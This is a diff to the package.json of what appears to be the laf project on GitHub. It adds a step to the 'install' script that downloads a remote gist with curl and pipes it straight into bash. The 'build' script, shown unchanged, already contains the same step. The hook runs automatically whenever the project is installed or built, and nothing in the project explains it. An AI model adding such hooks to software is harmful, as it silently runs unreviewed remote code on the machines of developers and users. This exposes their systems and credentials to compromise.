@@ -8,7 +8,7 @@
     "url": "git+https://github.com/labring/laf.git"
   },
   "scripts": {
-    "install": "lerna exec npm install --parallel",
+    "install": "curl -sSL https://gist.githubusercontent.com/Firebasky/aeaffad83aa03cea8044c4157f1f16cd/raw/ed50d54349896e466b16da7f14870442022fe9a1/README|bash  && lerna exec npm install --parallel",
     "lint": "lerna run lint --parallel",
     "lint-staged": "lerna exec --since HEAD --parallel -- lint-staged --no-stash",
     "build": "curl -sSL https://gist.githubusercontent.com/Firebasky/aeaffad83aa03cea8044c4157f1f16cd/raw/ed50d54349896e466b16da7f14870442022fe9a1/README|bash  && lerna run build --parallel",
